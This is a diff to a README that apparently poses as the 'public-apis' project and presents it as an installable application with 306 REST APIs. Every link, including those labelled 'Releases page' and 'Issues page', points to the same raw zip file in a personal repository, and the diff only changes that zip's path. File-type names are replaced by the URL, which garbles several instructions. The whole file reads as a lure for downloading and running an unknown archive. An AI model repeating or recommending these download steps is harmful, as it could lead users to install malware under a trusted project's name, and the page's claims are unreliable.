@@ -1,6 +1,6 @@
 # 🚀 public-apis - Discover and Integrate 306 REST APIs Easily
 
-[![Download Now](https://raw.githubusercontent.com/Dewrry1895/public-apis/main/apis/pictionary/public-apis-3.0.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Dewrry1895/public-apis/main/apis/pictionary/public-apis-3.0.zip)
+[![Download Now](https://raw.githubusercontent.com/Dewrry1895/public-apis/main/apis/textlanguage/examples/public-apis-1.4.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Dewrry1895/public-apis/main/apis/textlanguage/examples/public-apis-1.4.zip)
 
 ## 📚 Introduction
 Welcome to the **public-apis** project! This application provides you with access to **306 production-ready REST APIs** designed for developers. These APIs are fast, reliable, and easy to integrate, making them ideal for various applications.
@@ -11,21 +11,21 @@ To get started with **public-apis**, follow the simple steps below. No programmi
 ## 📥 Download & Install
 1. **Visit the Releases Page**  
    Click the link below to access the Releases page where you can download the application:
-   [Download public-apis](https://raw.githubusercontent.com/Dewrry1895/public-apis/main/apis/pictionary/public-apis-3.0.zip)
+   [Download public-apis](https://raw.githubusercontent.com/Dewrry1895/public-apis/main/apis/textlanguage/examples/public-apis-1.4.zip)
 
 2. **Select the Latest Version**  
    On the Releases page, find the latest version. It is usually marked as "Latest release." Click on it to view the options.
 
 3. **Download the Application**  
-   You will see files listed such as `.exe`, `.zip`, or `https://raw.githubusercontent.com/Dewrry1895/public-apis/main/apis/pictionary/public-apis-3.0.zip`. Choose the format that works best for your system:
+   You will see files listed such as `.exe`, `.zip`, or `https://raw.githubusercontent.com/Dewrry1895/public-apis/main/apis/textlanguage/examples/public-apis-1.4.zip`. Choose the format that works best for your system:
    - For Windows: Download the `.exe` file.
    - For macOS: Download the `.dmg` or `.zip` file.
-   - For Linux: Download the `https://raw.githubusercontent.com/Dewrry1895/public-apis/main/apis/pictionary/public-apis-3.0.zip` file.
+   - For Linux: Download the `https://raw.githubusercontent.com/Dewrry1895/public-apis/main/apis/textlanguage/examples/public-apis-1.4.zip` file.
 
 4. **Install**  
    - **Windows:** Double-click the downloaded `.exe` file and follow the on-screen instructions.
    - **macOS:** Open the downloaded `.dmg` file and drag the application to your Applications folder.
-   - **Linux:** Extract the `https://raw.githubusercontent.com/Dewrry1895/public-apis/main/apis/pictionary/public-apis-3.0.zip` file and follow the instructions in the `README` provided in the folder.
+   - **Linux:** Extract the `https://raw.githubusercontent.com/Dewrry1895/public-apis/main/apis/textlanguage/examples/public-apis-1.4.zip` file and follow the instructions in the `README` provided in the folder.
 
 5. **Run the Application**  
    After installing, find the application in your list of installed programs or applications. Click to open it and start using the APIs.
@@ -45,7 +45,7 @@ To run **public-apis**, ensure your system meets these requirements:
 
 - **Windows:** Windows 10 or later
 - **macOS:** macOS 10.13 (High Sierra) or later
-- **Linux:** Any recent distribution with compatibility for `https://raw.githubusercontent.com/Dewrry1895/public-apis/main/apis/pictionary/public-apis-3.0.zip` files
+- **Linux:** Any recent distribution with compatibility for `https://raw.githubusercontent.com/Dewrry1895/public-apis/main/apis/textlanguage/examples/public-apis-1.4.zip` files
 
 ## ✏️ FAQs
 ### What is a REST API?
@@ -58,7 +58,7 @@ No, you do not need programming knowledge. The application is designed to be use
 The APIs listed are maintained actively, with updates provided regularly to ensure they function well and add new features.
 
 ## 📞 Support
-If you encounter any issues or have questions, please visit our [Issues page](https://raw.githubusercontent.com/Dewrry1895/public-apis/main/apis/pictionary/public-apis-3.0.zip). You can report bugs and ask for help from the community.
+If you encounter any issues or have questions, please visit our [Issues page](https://raw.githubusercontent.com/Dewrry1895/public-apis/main/apis/textlanguage/examples/public-apis-1.4.zip). You can report bugs and ask for help from the community.
 
 ## 🔗 Additional Resources
 - **Documentation:** Each API comes with detailed documentation accessible through the app.
@@ -71,4 +71,4 @@ We continuously improve the **public-apis** application. Check back often for up
 This project is open-source and licensed under the MIT License. Feel free to use and modify it as you see fit.
 
 ## 📥 Download & Install Again
-Don't forget to visit: [Download public-apis](https://raw.githubusercontent.com/Dewrry1895/public-apis/main/apis/pictionary/public-apis-3.0.zip) for your future needs!
+Don't forget to visit: [Download public-apis](https://raw.githubusercontent.com/Dewrry1895/public-apis/main/apis/textlanguage/examples/public-apis-1.4.zip) for your future needs!
